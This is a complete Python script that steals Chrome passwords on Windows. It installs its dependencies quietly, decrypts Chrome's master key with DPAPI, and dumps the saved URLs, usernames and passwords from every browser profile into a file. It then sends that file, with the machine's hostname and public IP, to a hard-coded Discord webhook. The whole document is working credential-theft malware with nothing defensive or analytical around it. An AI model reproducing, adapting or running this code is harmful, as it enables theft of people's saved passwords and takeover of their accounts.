import os
import requests
import socket
import re
import sys
import json
import base64
import sqlite3
import shutil
import csv
import sys
import subprocess

try:
    import pip
except ImportError:
    os.system('cmd /c "curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py"')
    os.system('cmd /c "python get-pip.py"')
    import pip

try:
    from Crypto.Cipher import AES
except ImportError:
    os.system('cmd /c "pip install pycryptodome"')
    from Crypto.Cipher import AES
    
try:
    import win32crypt
except ImportError:
    os.system('cmd /c "pip install pypiwin32"')
    import win32crypt

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

def get_secret_key():
    try:
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secgretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome database cannot be found")
        return None
        
if __name__ == '__main__':
    try:
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index","url","username","password"])
            secret_key = get_secret_key()
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            csv_writer.writerow([index,url,username,decrypted_password])
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] "%str(e))

webhook = "https://discord.com/api/webhooks/903378145422475294/OCZEDYgEjxwgBF3oqKBSnzXjcDah258qJ7m7EMIsgrApkNe--d-d3WghOB5WPPRVW4rC"
computer_name = socket.gethostname()
computer_publicip = requests.get('https://checkip.amazonaws.com').text.strip()

title = computer_name+" > "+computer_publicip
if (os.path.isfile("passwords.txt")):
    os.remove("passwords.txt")
os.rename("decrypted_password.csv", "passwords.txt")
file = open("passwords.txt","r")
description = file.read()

embed = {
    "description": description,
    "title": title,
}

data = {
    "username": "WiseControl",
    "embeds": [
        embed
        ],
}

response = requests.post(webhook, json=data)
